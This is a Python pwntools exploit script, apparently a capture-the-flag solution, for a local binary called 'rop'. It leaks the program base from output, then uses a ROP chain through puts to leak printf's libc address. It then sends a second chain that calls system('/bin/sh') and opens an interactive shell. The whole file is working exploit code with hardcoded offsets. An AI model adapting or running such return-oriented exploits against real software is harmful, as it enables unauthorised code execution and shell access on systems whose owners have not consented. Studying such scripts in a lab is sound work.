#!/usr/bin/env python3

from pwn import *
import binascii
import os

exe = context.binary = ELF("rop")

if args.REMOTE:
    libc = ELF("./libc-docker.so")
else:
    libc = ELF("/usr/lib/libc.so.6")

remotehost = ("127.0.0.1", 22226)

context.binary = exe.path
context.terminal = ['st', '-e', 'sh', '-c']

gdbscript = '''
b *main
continue
'''.format(**locals())


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#################################################################

rip_offset = 264
main_offset = 0x1169
got_plt_offset = 0x4000
printf_got_offset = 0x20
pop_rdi_ret_offset = 0x1263
puts_offset = 0x1030
printf_offset = 0x58590
binsh_offset = 0x18c966
system_offset = 0x4a120

io = start()

main_addr = int(io.readline(False).split(b":")[1], 0)
exe_base = main_addr - main_offset

log.info("main address: 0x%x" % (main_addr, ))
log.info("base exe address: 0x%x" % (exe_base, ))

# puts(&got_plt + printf_got_offset)
#
# %rdi = &got_plt + printf_got_offset
# call &puts
'''
RIP = &(pop rdi; ret)

RSP =>    [ &got_plt + printf_got_offset ]
          [ puts ]
          [ main ]
'''

payload = dict()

payload[rip_offset]        = exe_base + pop_rdi_ret_offset
payload[rip_offset + 8]    = exe_base + got_plt_offset + printf_got_offset
payload[rip_offset + 16]   = exe_base + puts_offset
payload[rip_offset + 24]   = exe_base + main_offset

payload = fit(payload)

io.recvline()
io.sendline(payload)
io.recvline()
printf_libc = u64(io.readline(False).ljust(8, b'\x00'))
libc_base = printf_libc - printf_offset

log.info("printf addr: 0x%x" % (printf_libc, ))
log.info("printf base: 0x%x" % (libc_base, ))

io.recvline()

# system("/bin/sh")
#
# %rdi = &("/bin/sh")
# call &system
'''
RIP = &(pop rdi; ret)

RSP =>    [ &("/bin/sh") ]
          [ system ]
'''

payload = dict()

payload[rip_offset]        = exe_base + pop_rdi_ret_offset
payload[rip_offset + 8]    = libc_base + binsh_offset
payload[rip_offset + 16]   = libc_base + system_offset

payload = fit(payload)

io.sendline(payload)
io.recvline()

io.interactive()